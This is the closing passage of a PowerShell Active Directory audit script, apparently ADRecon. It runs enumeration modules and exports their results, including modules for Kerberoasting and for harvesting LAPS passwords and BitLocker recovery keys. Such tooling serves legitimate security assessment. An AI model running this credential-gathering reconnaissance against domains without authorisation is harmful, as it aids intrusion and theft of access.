                Write-Output "[*] LDAP bind Successful"
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] "LDAP://RootDSE")
            If(!($objDomain.name))
            {
                Write-Output "[Invoke-ADRecon] LDAP bind Unsuccessful"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug "LDAP Bing Successful"
    }

    Write-Output "[*] Commencing - $date"
    If ($ADRDomain)
    {
        Write-Output "[-] Domain"
        $ADRObject = Get-ADRDomain -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Domain"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If ($ADRForest)
    {
        Write-Output "[-] Forest"
        $ADRObject = Get-ADRForest -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Forest"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If ($ADRTrust)
    {
        Write-Output "[-] Trusts"
        $ADRObject = Get-ADRTrust -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Trusts"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If ($ADRSite)
    {
        Write-Output "[-] Sites"
        $ADRObject = Get-ADRSite -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Sites"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If ($ADRSubnet)
    {
        Write-Output "[-] Subnets"
        $ADRObject = Get-ADRSubnet -Protocol $Protocol -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Subnets"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If ($ADRPasswordPolicy)
    {
        Write-Output "[-] Default Password Policy"
        $ADRObject = Get-ADRDefaultPasswordPolicy -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DefaultPasswordPolicy"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output "[-] Fine Grained Password Policy - May need a Privileged Account"
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Protocol $Protocol -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "FineGrainedPasswordPolicy"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If ($ADRDomainControllers)
    {
        Write-Output "[-] Domain Controllers"
        $ADRObject = Get-ADRDomainController -Protocol $Protocol -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DomainControllers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If ($ADRUsers)
    {
        Write-Output "[-] Users - May take some time"
        $ADRObject = Get-ADRUser -Protocol $Protocol -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Users"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRUsers
    }
    If ($ADRUserSPNs)
    {
        Write-Output "[-] User SPNs"
        $ADRObject = Get-ADRUserSPN -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "UserSPNs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRUserSPNs
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output "[-] PasswordAttributes - Experimental"
        $ADRObject = Get-ADRPasswordAttributes -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "PasswordAttributes"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If ($ADRGroups)
    {
        Write-Output "[-] Groups - May take some time"
        $ADRObject = Get-ADRGroup -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Groups"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroups
    }
    If ($ADRGroupMembers)
    {
        Write-Output "[-] Group Memberships - May take some time"

        $ADRObject = Get-ADRGroupMember -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "GroupMembers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If ($ADROUs)
    {
        Write-Output "[-] OrganizationalUnits (OUs)"
        $ADRObject = Get-ADROU -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "OUs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If ($ADRGPOs)
    {
        Write-Output "[-] GPOs"
        $ADRObject = Get-ADRGPO -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "GPOs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If ($ADRgPLinks)
    {
        Write-Output "[-] gPLinks - Scope of Management (SOM)"
        $ADRObject = Get-ADRgPLink -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "gPLinks"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If ($ADRDNSZones)
    {
        Write-Output "[-] DNS Zones and Records"
        Get-ADRDNSZone -Protocol $Protocol -ADROutputDir $ADROutputDir -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -OutputType $OutputType
        Remove-Variable ADRDNSZones
    }
    If ($ADRPrinters)
    {
        Write-Output "[-] Printers"
        $ADRObject = Get-ADRPrinter -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Printers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If ($ADRComputers)
    {
        Write-Output "[-] Computers - May take some time"
        $ADRObject = Get-ADRComputer -Protocol $Protocol -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Computers"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRComputers
    }
    If ($ADRComputerSPNs)
    {
        Write-Output "[-] Computer SPNs"
        $ADRObject = Get-ADRComputerSPN -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "ComputerSPNs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRComputerSPNs
    }
    If ($ADRLAPS)
    {
        Write-Output "[-] LAPS - Needs Privileged Account"
        $ADRObject = Get-ADRLAPSCheck -Protocol $Protocol -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "LAPS"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If ($ADRBitLocker)
    {
        Write-Output "[-] BitLocker Recovery Keys - Needs Privileged Account"
        $ADRObject = Get-ADRBitLocker -Protocol $Protocol -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "BitLockerRecoveryKeys"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If ($ADRACLs)
    {
        Write-Output "[-] ACLs - May take some time"
        $ADRObject = Get-ADRACL -Protocol $Protocol -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ADRACLs
    }
    If ($ADRGPOReport)
    {
        Write-Output "[-] GPOReport - May take some time"
        Get-ADRGPOReport -Protocol $Protocol -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ADRGPOReport
    }
    If ($ADRKerberoast)
    {
        Write-Output "[-] Kerberoast"
        $ADRObject = Get-ADRKerberoast -Protocol $Protocol -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Kerberoast"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output "[-] Domain Accounts used for Service Logon - Needs Privileged Account"
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Protocol $Protocol -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "DomainAccountsusedforServiceLogon"
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date).TotalMinutes)

    $AboutADRecon = Get-ADRAbout -Protocol $Protocol -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains "CSV") -or ($OutputType -Contains "XML") -or ($OutputType -Contains "JSON") -or ($OutputType -Contains "HTML") )
    {
        If ($AboutADRecon)
        {
            Export-ADR -ADRObj $AboutADRecon -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "AboutADRecon"
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime)"
        Write-Output "[*] Output Directory: $ADROutputDir"
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        'STDOUT'
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime)"
            }
        }
        'HTML'
        {
            Export-ADR -ADRObj $(New-Object PSObject) -ADROutputDir $ADROutputDir -OutputType $([array] "HTML") -ADRModuleName "Index"
        }
        'EXCEL'
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location $returndir
    Remove-Variable returndir

    If (($Protocol -eq 'ADWS') -and $UseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If ($Protocol -eq 'LDAP')
    {
        $objDomain.Dispose()
        $objDomainRootDSE.Dispose()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

Invoke-ADRecon -GenExcel $GenExcel -Protocol $Protocol -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads

If ($Log)
{
    Stop-Transcript
}
